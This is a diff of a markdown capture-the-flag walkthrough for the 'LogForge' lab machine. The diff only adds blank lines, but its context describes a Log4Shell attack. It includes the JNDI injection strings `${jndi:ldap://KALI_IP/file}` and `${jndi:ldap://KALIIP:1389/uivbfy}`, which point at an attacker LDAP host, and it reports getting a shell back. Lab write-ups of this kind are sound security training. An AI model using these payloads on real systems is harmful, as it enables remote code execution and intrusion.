@@ -82,6 +82,7 @@ server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
 ![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/1.png)
 
 While going to `/images` gives me
+
 ![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/2.png)
 
 Notice that it is running Apache 2.4.41 AND Tomcat/9.0.31
@@ -106,6 +107,7 @@ To set up and test use netcat to listen on port 389
 Then supply `${jndi:ldap://KALI_IP/file}` into input fields and see if anything connects back
 
 I was able to get a connection (meaning its vulnerable)
+
 ![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/3.png)
 
 ![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/3.1.png)
@@ -160,6 +162,7 @@ ldap://KALI:1389/uivbfy
 My payload looked like this `${jndi:ldap://KALIIP:1389/uivbfy}`
 
 Then after putting it into the field I got a shell back
+
 ![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/4.png)
 
 ```
